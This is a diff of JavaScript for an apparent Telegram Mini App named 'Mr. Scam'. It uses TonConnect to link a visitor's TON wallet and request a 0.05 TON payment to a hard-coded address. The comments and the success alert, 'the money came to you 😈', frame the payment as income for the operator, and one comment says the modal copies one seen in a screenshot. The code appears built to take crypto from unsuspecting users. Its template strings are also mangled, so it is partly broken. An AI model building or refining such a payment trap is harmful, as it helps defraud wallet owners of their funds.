@@ -10,39 +10,42 @@ if (tg.initDataUnsafe?.user) {
 }
 usernameEl.textContent = username;
 
-// TonConnect UI (новая версия)
+// TonConnect UI — это даст точно такую модалку, как на скрине
 const tonConnectUI = new TonConnectUI({
   manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
-  buttonRootId: 'connect-wallet'
+  buttonRootId: 'connect-container',  // ← Кнопка вставится сюда автоматически
+  actionsConfiguration: {
+    twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на ссылку твоего бота, например https://t.me/MrScamTestBot
+  }
 });
 
 let connectedWallet = null;
 tonConnectUI.onStatusChange(wallet => {
   if (wallet) {
     connectedWallet = wallet.account.address;
-    document.getElementById('wallet-status').innerHTML = `<strong>подключён</strong><br>\( {connectedWallet.slice(0,8)}... \){connectedWallet.slice(-6)}`;
+    document.getElementById('wallet-status').textContent = `подключён: \( {connectedWallet.slice(0,6)}... \){connectedWallet.slice(-4)}`;
   } else {
     connectedWallet = null;
     document.getElementById('wallet-status').textContent = 'не подключён';
   }
 });
 
-// Отправка TON на твой адрес
-document.getElementById('send-ton').onclick = async () => {
-  if (!connectedWallet) return alert('⚠️ Подключи кошелёк сначала!');
+// Оплата 0.05 TON на твой адрес
+document.getElementById('payment-btn').onclick = async () => {
+  if (!connectedWallet) return alert('⚠️ Сначала подключите кошелёк!');
 
   const transaction = {
     validUntil: Math.floor(Date.now() / 1000) + 600,
     messages: [{
-      address: 'UQBpBH_apAYKPChl7V1wfEeZ1JovWFIr2VXfzTVUVQfDXHrZ', // Твой реальный адрес
+      address: 'UQBpBH_apAYKPChl7V1wfEeZ1JovWFIr2VXfzTVUVQfDXHrZ',
       amount: '50000000' // 0.05 TON
     }]
   };
 
   try {
     await tonConnectUI.sendTransaction(transaction);
-    alert('✅ 0.05 TON успешно отправлено в Mr. Scam!\nПришло на твой кошелёк 😈');
+    alert('✅ 0.05 TON внесено! Деньги пришли тебе 😈');
   } catch (e) {
-    alert('❌ Ошибка: ' + (e.message || 'Отменено'));
+    alert('❌ Ошибка или отменено');
   }
 };
